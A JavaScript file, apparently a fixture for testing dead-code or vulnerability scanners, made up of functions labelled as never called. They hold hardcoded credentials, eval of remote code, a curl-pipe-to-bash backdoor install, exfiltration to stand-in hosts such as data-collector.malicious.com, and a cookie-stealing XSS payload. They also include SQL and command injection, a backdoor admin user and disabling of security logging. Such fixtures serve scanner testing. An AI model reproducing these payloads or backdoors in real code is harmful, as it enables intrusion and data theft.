// DEAD CODE: This entire service is never imported or used anywhere
// All vulnerabilities in this file are in dead code paths

import axios from 'axios';

// DEAD CLASS: Never instantiated or used
class OldApiService {
    constructor() {
        // VULNERABILITY: Hardcoded credentials in dead code
        this.apiKey = 'sk-old-api-key-12345';
        this.secretToken = 'old-secret-token-abcdef';
        this.adminPassword = 'old-admin-password-123';
        
        this.baseURL = 'https://legacy-api.example.com';
        this.timeout = 30000;
        
        // VULNERABILITY: Insecure configuration in dead code
        this.client = axios.create({
            baseURL: this.baseURL,
            timeout: this.timeout,
            headers: {
                'X-API-Key': this.apiKey,
                'Authorization': `Bearer ${this.secretToken}`
            }
        });
    }

    // DEAD FUNCTION: Never called
    async executeRemoteCommand(command) {
        try {
            // VULNERABILITY: Remote Code Execution attempt in dead code
            const payload = {
                cmd: command,
                shell: '/bin/bash',
                execute: true,
                admin_key: this.adminPassword
            };

            // VULNERABILITY: Sending RCE payload to external service
            const response = await this.client.post('/admin/execute', payload);
            
            // VULNERABILITY: Executing returned code locally
            if (response.data.code) {
                eval(response.data.code); // RCE vulnerability in dead code
            }
            
            return response.data;
        } catch (error) {
            console.error('Remote command execution failed:', error);
            
            // VULNERABILITY: Fallback RCE attempt in dead code
            try {
                const fallbackPayload = `{"command": "${command}", "key": "${this.adminPassword}"}`;
                const fallbackResponse = await fetch('/api/legacy-exec', {
                    method: 'POST',
                    body: fallbackPayload,
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const result = await fallbackResponse.text();
                // VULNERABILITY: Execute response as JavaScript
                eval(result);
            } catch (fallbackError) {
                console.error('Fallback execution failed:', fallbackError);
            }
        }
    }

    // DEAD FUNCTION: Never called
    async uploadMaliciousFile(fileContent, fileName) {
        try {
            // VULNERABILITY: Uploading potentially malicious files in dead code
            const maliciousPayload = {
                content: btoa(fileContent), // Base64 encode
                filename: fileName,
                autoExecute: true, // Dangerous flag
                overwrite: true,
                destination: '/var/www/html/' + fileName
            };

            const response = await this.client.post('/admin/upload-raw', maliciousPayload);
            
            // VULNERABILITY: Attempt to execute uploaded file
            if (response.data.success) {
                const executionPayload = {
                    file: fileName,
                    method: 'eval',
                    admin_token: this.secretToken
                };
                
                await this.client.post('/admin/execute-file', executionPayload);
            }
            
            return response.data;
        } catch (error) {
            console.error('Malicious file upload failed:', error);
        }
    }

    // DEAD FUNCTION: Never called
    async injectSqlPayload(table, payload) {
        try {
            // VULNERABILITY: SQL injection attempt in dead code
            const sqlPayload = {
                query: `INSERT INTO ${table} VALUES ('${payload}'); DROP TABLE users; --`,
                execute_raw: true,
                bypass_validation: true,
                admin_key: this.adminPassword
            };

            const response = await this.client.post('/admin/raw-sql', sqlPayload);
            return response.data;
        } catch (error) {
            console.error('SQL injection failed:', error);
            
            // VULNERABILITY: Alternative SQL injection method
            try {
                const altPayload = {
                    table: table,
                    data: payload,
                    raw_mode: true,
                    union_select: "UNION SELECT username,password FROM admin_users",
                    admin_auth: this.secretToken
                };
                
                await this.client.post('/legacy/insert', altPayload);
            } catch (altError) {
                console.error('Alternative SQL injection failed:', altError);
            }
        }
    }

    // DEAD FUNCTION: Never called
    async attemptSystemTakeover() {
        try {
            // VULNERABILITY: System takeover attempt in dead code
            const takeoverPayloads = [
                // Payload 1: Create backdoor user
                {
                    action: 'create_user',
                    username: 'backdoor_admin',
                    password: 'takeover123',
                    privileges: 'ALL',
                    shell: '/bin/bash'
                },
                
                // Payload 2: Install backdoor script
                {
                    action: 'install_backdoor',
                    script: 'curl -s http://malicious-site.com/backdoor.sh | bash',
                    persist: true,
                    hide: true
                },
                
                // Payload 3: Disable security
                {
                    action: 'disable_security',
                    services: ['firewall', 'antivirus', 'logging'],
                    permanent: true
                }
            ];

            for (const payload of takeoverPayloads) {
                try {
                    await this.client.post('/admin/system-control', {
                        ...payload,
                        auth_token: this.secretToken,
                        admin_key: this.adminPassword
                    });
                } catch (error) {
                    console.error('Takeover payload failed:', error);
                }
            }
        } catch (error) {
            console.error('System takeover failed:', error);
        }
    }

    // DEAD FUNCTION: Never called
    async exfiltrateData() {
        try {
            // VULNERABILITY: Data exfiltration attempt in dead code
            const exfilPayloads = [
                '/admin/dump-database',
                '/admin/export-users',
                '/admin/get-secrets',
                '/admin/download-logs',
                '/admin/backup-all'
            ];

            const exfilData = {};
            
            for (const endpoint of exfilPayloads) {
                try {
                    const response = await this.client.get(endpoint, {
                        headers: {
                            'X-Admin-Token': this.secretToken,
                            'X-Bypass-Security': 'true'
                        }
                    });
                    
                    exfilData[endpoint] = response.data;
                    
                    // VULNERABILITY: Send stolen data to external server
                    await fetch('http://data-collector.malicious.com/collect', {
                        method: 'POST',
                        body: JSON.stringify({
                            source: window.location.hostname,
                            endpoint: endpoint,
                            data: response.data,
                            timestamp: Date.now()
                        })
                    });
                } catch (error) {
                    console.error(`Exfiltration from ${endpoint} failed:`, error);
                }
            }
            
            return exfilData;
        } catch (error) {
            console.error('Data exfiltration failed:', error);
        }
    }

    // DEAD FUNCTION: Never called
    async establishBackdoor() {
        try {
            // VULNERABILITY: Backdoor establishment in dead code
            const backdoorCode = `
                (function() {
                    // Persistent backdoor
                    window.backdoorActive = true;
                    
                    // Command execution interface
                    window.execCmd = function(cmd) {
                        eval(cmd);
                    };
                    
                    // Remote code loader
                    window.loadRemoteCode = function(url) {
                        fetch(url).then(r => r.text()).then(code => eval(code));
                    };
                    
                    // Data exfiltration
                    window.sendData = function(data) {
                        fetch('http://backdoor-collector.com/data', {
                            method: 'POST',
                            body: JSON.stringify(data)
                        });
                    };
                    
                    // Auto-execute on page load
                    if (document.readyState === 'complete') {
                        window.loadRemoteCode('http://backdoor-collector.com/payload.js');
                    }
                })();
            `;

            // VULNERABILITY: Execute backdoor code
            eval(backdoorCode);
            
            // VULNERABILITY: Inject backdoor into page
            const script = document.createElement('script');
            script.textContent = backdoorCode;
            document.head.appendChild(script);
            
            // VULNERABILITY: Store backdoor in localStorage for persistence
            localStorage.setItem('system_config', btoa(backdoorCode));
            
        } catch (error) {
            console.error('Backdoor establishment failed:', error);
        }
    }

    // DEAD FUNCTION: Never called
    async bypassSecurityControls() {
        try {
            // VULNERABILITY: Security bypass attempts in dead code
            const bypassMethods = [
                // Method 1: Cookie manipulation
                () => {
                    document.cookie = 'admin=true; path=/';
                    document.cookie = 'bypass_security=1; path=/';
                    document.cookie = 'debug_mode=enabled; path=/';
                },
                
                // Method 2: localStorage manipulation
                () => {
                    localStorage.setItem('admin_access', 'granted');
                    localStorage.setItem('security_disabled', 'true');
                    localStorage.setItem('root_privileges', 'enabled');
                },
                
                // Method 3: URL manipulation
                () => {
                    window.history.replaceState({}, '', window.location.pathname + '?admin=1&bypass=1');
                },
                
                // Method 4: Header injection
                async () => {
                    await fetch('/api/admin/status', {
                        headers: {
                            'X-Admin-Override': 'true',
                            'X-Security-Bypass': 'enabled',
                            'X-Root-Access': 'granted'
                        }
                    });
                }
            ];

            for (const method of bypassMethods) {
                try {
                    await method();
                } catch (error) {
                    console.error('Bypass method failed:', error);
                }
            }
        } catch (error) {
            console.error('Security bypass failed:', error);
        }
    }
}

// DEAD FUNCTIONS: Never called as they're not exported or referenced

// VULNERABILITY: Global RCE function in dead code
function executeArbitraryCode(code) {
    try {
        eval(code); // RCE vulnerability in dead function
    } catch (error) {
        console.error('Code execution failed:', error);
    }
}

// VULNERABILITY: Global backdoor function in dead code  
function activateGlobalBackdoor() {
    window.globalBackdoor = {
        exec: (cmd) => eval(cmd),
        load: (url) => fetch(url).then(r => r.text()).then(code => eval(code)),
        persist: () => localStorage.setItem('backdoor', 'active')
    };
}

// VULNERABILITY: Hardcoded credentials in dead code
const LEGACY_CREDENTIALS = {
    api_key: 'legacy-api-key-123456',
    secret: 'legacy-secret-abcdef',
    admin_pass: 'legacy-admin-999',
    backdoor_key: 'backdoor-access-key',
    master_token: 'master-override-token'
};

// DEAD EXPORT: Never imported anywhere
export default OldApiService;

// DEAD CODE: Commented out malicious functions
/*
// VULNERABILITY: SQL injection helper in commented dead code
function buildMaliciousQuery(table, userInput) {
    return `SELECT * FROM ${table} WHERE id = '${userInput}' OR '1'='1'; DROP TABLE ${table}; --`;
}

// VULNERABILITY: XSS payload generator in commented dead code
function generateXSSPayload(target) {
    return `<script>fetch('http://malicious.com/steal?data=' + document.cookie)</script>`;
}

// VULNERABILITY: Command injection helper in commented dead code
function injectCommand(userInput) {
    return `ls -la; ${userInput}; cat /etc/passwd`;
}
*/

// DEAD CONDITIONAL CODE: Never executed
if (false) {
    // VULNERABILITY: RCE in dead conditional
    eval(maliciousCode);
    
    // VULNERABILITY: Backdoor activation in dead conditional
    activateGlobalBackdoor();
    
    // VULNERABILITY: Data exfiltration in dead conditional
    fetch('http://steal-data.com/collect', {
        method: 'POST',
        body: JSON.stringify(document.cookie)
    });
}